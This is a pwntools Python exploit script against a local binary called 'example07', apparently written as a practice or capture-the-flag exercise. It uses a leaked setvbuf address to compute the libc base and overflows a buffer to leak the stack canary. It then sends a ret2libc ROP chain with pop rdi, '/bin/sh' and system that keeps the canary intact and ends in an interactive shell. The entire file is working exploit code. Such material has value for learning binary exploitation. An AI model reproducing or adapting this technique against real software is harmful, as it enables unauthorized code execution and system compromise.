from pwn import *  # NOQA

context.terminal = ['tmux', 'splitw', '-h']

p = process('./example07')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p, "b * main")

setvbuf = int(p.recvline()[2:], 16)
libc_base = setvbuf - libc.symbols['setvbuf']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
pop_rdi = libc_base + libc_rop.find_gadget(['pop rdi', 'ret']).address
ret = libc_base + libc_rop.find_gadget(['ret']).address


# Extra A b/c null byte at end of stack canary.
p.sendline('A' * 41)

leak = u64(b'\x00' + p.recvline()[-8-6:-1-6])
print(leak)
print(hex(leak))

payload = b'A' * 40
payload += p64(leak)
payload += b'BBBBBBBB'  # RBP
# payload += b'CCCCCCCC'  # RIP
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
print(payload)

p.sendline(payload)

p.sendline("exit")

p.interactive()
